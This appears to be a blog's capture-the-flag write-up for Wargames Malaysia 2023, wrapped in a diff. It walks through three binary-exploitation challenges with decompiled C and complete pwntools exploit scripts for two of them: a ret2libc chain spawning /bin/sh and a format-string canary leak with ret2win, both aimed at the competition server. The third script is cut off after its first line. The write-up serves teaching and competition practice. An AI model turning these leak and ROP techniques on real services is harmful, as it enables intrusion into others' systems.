@@ -1,0 +1,261 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>WGMY 2023 - kestryix</title><meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="Wargames Malaysia 2023 Write Ups"><meta property="og:image" content><meta property="og:url" content="https://kestryix.github.io/ctf/wgmy23/"><meta property="og:site_name" content="kestryix"><meta property="og:title" content="WGMY 2023"><meta property="og:description" content="Wargames Malaysia 2023 Write Ups"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2023-12-18T22:00:00+08:00"><meta property="article:modified_time" content="2023-12-18T22:00:00+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="WGMY 2023"><meta name=twitter:description content="Wargames Malaysia 2023 Write Ups"><script src=https://kestryix.github.io/js/feather.min.js></script><link href=https://kestryix.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://kestryix.github.io/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://kestryix.github.io/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css media="(prefers-color-scheme: dark)"></head><body><div class=content><header><div class=main><a href=https://kestryix.github.io/>kestryix</a></div><nav><a href=/>Home</a>
+<a href=/ctf>CTFs</a>
+<a href=/sysadmin>Sysadmin</a></nav></header><main><article><div class=title><h1 class=title>WGMY 2023</h1><div class=meta>Posted on Dec 18, 2023</div></div><section class=body><p>For this CTF, I mainly worked on the pwn challenges as I wanted to try and learn something new :D I managed to solve 3 of the pwns and will be detailing my write up below</p><h1 id=magic-door-942>Magic Door (942)</h1><h2 id=idea>idea</h2><p>basic ret2libc after passing the first check in the function <code>open_the_door</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#a6e22e>open_the_door</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> s1[<span style=color:#ae81ff>12</span>]; <span style=color:#75715e>// [rsp+0h] [rbp-10h] BYREF
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> v2; <span style=color:#75715e>// [rsp+Ch] [rbp-4h]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>initialize</span>();
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Welcome to the Magic Door !&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Which door would you like to open? &#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%11s&#34;</span>, s1);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>getchar</span>();
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span><span style=color:#a6e22e>strcmp</span>(s1, <span style=color:#e6db74>&#34;50015&#34;</span>) )
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>no_door_foryou</span>();
+</span></span><span style=display:flex><span>  v2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>atoi</span>(s1);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( v2 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>50015</span> )
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>no_door_foryou</span>();
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>magic_door</span>(<span style=color:#ae81ff>50015LL</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>In this function, the check will fail if the string entered is exactly <code>50015</code>, and if the integers in the string is not <code>50015</code>. This means that it is possible to pass this check by appending a letter to the end of <code>50015</code>. In my solution, I used <code>50015a</code>, which passes the <code>strcmp</code> check, and also the integer check in the function.</p><p>After reaching the <code>magic_door</code> function, it is possible to exploit it as we normally do with ret2libc challenges.</p><h2 id=solution>solution</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#p = process(&#39;./magic_door&#39;)</span>
+</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;13.229.84.41&#39;</span>, <span style=color:#ae81ff>10002</span>)
+</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> elf <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./magic_door&#39;</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./libc.so.6&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;50015a&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span> <span style=color:#ae81ff>72</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>rop <span style=color:#f92672>=</span> ROP(elf)
+</span></span><span style=display:flex><span>rop<span style=color:#f92672>.</span>call(rop<span style=color:#f92672>.</span>ret[<span style=color:#ae81ff>0</span>])
+</span></span><span style=display:flex><span>rop<span style=color:#f92672>.</span>puts(elf<span style=color:#f92672>.</span>got<span style=color:#f92672>.</span>puts)
+</span></span><span style=display:flex><span>rop<span style=color:#f92672>.</span>puts(elf<span style=color:#f92672>.</span>got<span style=color:#f92672>.</span>printf)
+</span></span><span style=display:flex><span>rop<span style=color:#f92672>.</span>magic_door()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(payload <span style=color:#f92672>+</span> rop<span style=color:#f92672>.</span>chain())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;go? </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>puts <span style=color:#f92672>=</span> u64(p<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>rstrip(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>))
+</span></span><span style=display:flex><span>printf <span style=color:#f92672>=</span> u64(p<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>rstrip(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> puts <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>sym<span style=color:#f92672>.</span>puts
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>binsh <span style=color:#f92672>=</span> (next(libc<span style=color:#f92672>.</span>search(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh&#39;</span>)))
+</span></span><span style=display:flex><span>rop <span style=color:#f92672>=</span> ROP([libc, elf])
+</span></span><span style=display:flex><span>rop<span style=color:#f92672>.</span>call(rop<span style=color:#f92672>.</span>ret[<span style=color:#ae81ff>0</span>])
+</span></span><span style=display:flex><span>rop<span style=color:#f92672>.</span>system(binsh)
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(payload <span style=color:#f92672>+</span> rop<span style=color:#f92672>.</span>chain())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>clean()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
+</span></span></code></pre></div><h1 id=pak-mat-burger-990>Pak Mat Burger (990)</h1><h2 id=idea-1>idea</h2><p>format string + canary + ret2win</p><pre tabindex=0><code>pak-mat-burger ➜ checksec pakmat_burger
+[*] &#39;/home/vela/wargamesmy/pak-mat-burger/pakmat_burger&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#66d9ef>__cdecl</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>s2; <span style=color:#75715e>// [rsp+0h] [rbp-40h]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> s1[<span style=color:#ae81ff>9</span>]; <span style=color:#75715e>// [rsp+Ah] [rbp-36h] BYREF
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> s[<span style=color:#ae81ff>10</span>]; <span style=color:#75715e>// [rsp+13h] [rbp-2Dh] BYREF
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> format[<span style=color:#ae81ff>12</span>]; <span style=color:#75715e>// [rsp+1Dh] [rbp-23h] BYREF
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> v8[<span style=color:#ae81ff>15</span>]; <span style=color:#75715e>// [rsp+29h] [rbp-17h] BYREF
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> v9; <span style=color:#75715e>// [rsp+38h] [rbp-8h]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>  v9 <span style=color:#f92672>=</span> <span style=color:#a6e22e>__readfsqword</span>(<span style=color:#ae81ff>0x28u</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>initialize</span>(argc, argv, envp);
+</span></span><span style=display:flex><span>  s2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>getenv</span>(<span style=color:#e6db74>&#34;SECRET_MESSAGE&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( s2 )
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Welcome to Pak Mat Burger!&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Please enter your name: &#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%11s&#34;</span>, format);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Hi &#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(format);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;, to order a burger, enter the secret message: &#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%8s&#34;</span>, s1);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span><span style=color:#a6e22e>strcmp</span>(s1, s2) )
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Great! What type of burger would you like to order? &#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%14s&#34;</span>, v8);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>getchar</span>();
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Please provide your phone number, we will delivered soon: &#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)<span style=color:#a6e22e>fgets</span>(s, <span style=color:#ae81ff>100</span>, stdin);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Sorry, the secret message is incorrect. Exiting...&#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Error: SECRET_MESSAGE environment variable not set. Exiting...&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>In this challenge, the secret always stay the same, therefore it is possible to hardcode it into the solution. From this, we can then leak the necessary addresses and carry out the exploit to get the flag.</p><h2 id=solution-1>solution</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#p = process(&#39;./pakmat_burger&#39;)</span>
+</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;13.229.84.41&#39;</span>, <span style=color:#ae81ff>10003</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%13$p.%17$p&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Hi &#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>secret <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;8d7e88a8&#39;</span>
+</span></span><span style=display:flex><span>canary <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;.&#39;</span>)<span style=color:#f92672>.</span>strip(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;.&#39;</span>)
+</span></span><span style=display:flex><span>leak <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;,&#39;</span>)<span style=color:#f92672>.</span>strip(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;,&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(secret)
+</span></span><span style=display:flex><span>print(canary)
+</span></span><span style=display:flex><span>print(leak)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>win <span style=color:#f92672>=</span> int(leak, <span style=color:#ae81ff>16</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x1a</span>
+</span></span><span style=display:flex><span>ret <span style=color:#f92672>=</span> int(leak,<span style=color:#ae81ff>16</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x18a</span>
+</span></span><span style=display:flex><span>print(win)
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(secret)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x25</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(int(canary, <span style=color:#ae81ff>16</span>))
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(ret)
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(win)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
+</span></span></code></pre></div><h1 id=free-juice-996>Free Juice (996)</h1><h2 id=idea-2>idea</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>chooseJuices</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> v1; <span style=color:#75715e>// [rsp+Ch] [rbp-4h] BYREF
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>displayAvailableJuices</span>();
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Enter the number of the chosen juice (1-5): &#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>_isoc99_scanf</span>(<span style=color:#e6db74>&#34;%d&#34;</span>, <span style=color:#f92672>&amp;</span>v1);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( v1 <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> v1 <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>5</span> )
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Invalid selection. Please try again.&#34;</span>);
+</span></span><span style=display:flex><span>  chosenJuice <span style=color:#f92672>=</span> <span style=color:#a6e22e>malloc</span>(<span style=color:#ae81ff>0x114uLL</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>chosenJuice )
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;Error allocating memory&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>strcpy</span>((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)chosenJuice, <span style=color:#f92672>&amp;</span>availableJuices[<span style=color:#ae81ff>276</span> <span style=color:#f92672>*</span> v1 <span style=color:#f92672>-</span> <span style=color:#ae81ff>276</span>]);
+</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>((_DWORD <span style=color:#f92672>*</span>)chosenJuice <span style=color:#f92672>+</span> <span style=color:#ae81ff>64</span>) <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(_DWORD <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>availableJuices[<span style=color:#ae81ff>276</span> <span style=color:#f92672>*</span> v1 <span style=color:#f92672>-</span> <span style=color:#ae81ff>20</span>];
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>strcpy</span>((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)chosenJuice <span style=color:#f92672>+</span> <span style=color:#ae81ff>260</span>, <span style=color:#f92672>&amp;</span>availableJuices[<span style=color:#ae81ff>276</span> <span style=color:#f92672>*</span> v1 <span style=color:#f92672>-</span> <span style=color:#ae81ff>16</span>]);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;You chose %s juice.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, (<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)chosenJuice);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>At first glance, this challenge looked like a heap challenge, but it could be solved with just the format string vulnerability that exists in <code>secret_juice</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#66d9ef>__cdecl</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> v4; <span style=color:#75715e>// [rsp+Ch] [rbp-4h] BYREF
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>initialize</span>(argc, argv, envp);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>displayMenu</span>();
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Enter your choice: &#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>_isoc99_scanf</span>(<span style=color:#e6db74>&#34;%d&#34;</span>, <span style=color:#f92672>&amp;</span>v4);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( v4 <span style=color:#f92672>==</span> <span style=color:#ae81ff>3</span> )
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>drinkJuices</span>();
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>continue</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( v4 <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>3</span> )
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( v4 <span style=color:#f92672>==</span> <span style=color:#ae81ff>4</span> )
+</span></span><span style=display:flex><span>      {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Exiting...&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>continue</span>;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( v4 <span style=color:#f92672>==</span> <span style=color:#ae81ff>1337</span> )
+</span></span><span style=display:flex><span>      {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>secretJuice</span>();
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>continue</span>;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( v4 <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span> )
+</span></span><span style=display:flex><span>      {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>chooseJuices</span>();
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>continue</span>;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( v4 <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span> )
+</span></span><span style=display:flex><span>      {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>refillJuices</span>();
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>continue</span>;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Invalid choice. Please try again.&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span> ( v4 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>4</span> );
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> <span style=color:#a6e22e>secretJuice</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> format[<span style=color:#ae81ff>264</span>]; <span style=color:#75715e>// [rsp+0h] [rbp-110h] BYREF
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> v2; <span style=color:#75715e>// [rsp+108h] [rbp-8h]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>  v2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>__readfsqword</span>(<span style=color:#ae81ff>0x28u</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( chosenJuice )
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Let us know what juices you need and we will get back to you!&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>_isoc99_scanf</span>(<span style=color:#e6db74>&#34;%256s&#34;</span>, format);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Current Juice : &#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(format);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>strncpy</span>((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)chosenJuice, format, <span style=color:#ae81ff>0xFFuLL</span>);
+</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>((_BYTE <span style=color:#f92672>*</span>)chosenJuice <span style=color:#f92672>+</span> <span style=color:#ae81ff>255</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>putchar</span>(<span style=color:#ae81ff>10</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Please choose a juice first.&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>__readfsqword</span>(<span style=color:#ae81ff>0x28u</span>) <span style=color:#f92672>^</span> v2;
+</span></span></code></pre></div><p>By using the format string vulnerability in the <code>secret_juice</code> function, it is possible to leak the addresses and use gadgets to get a shell on the server.</p><h2 id=solution-2>solution</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
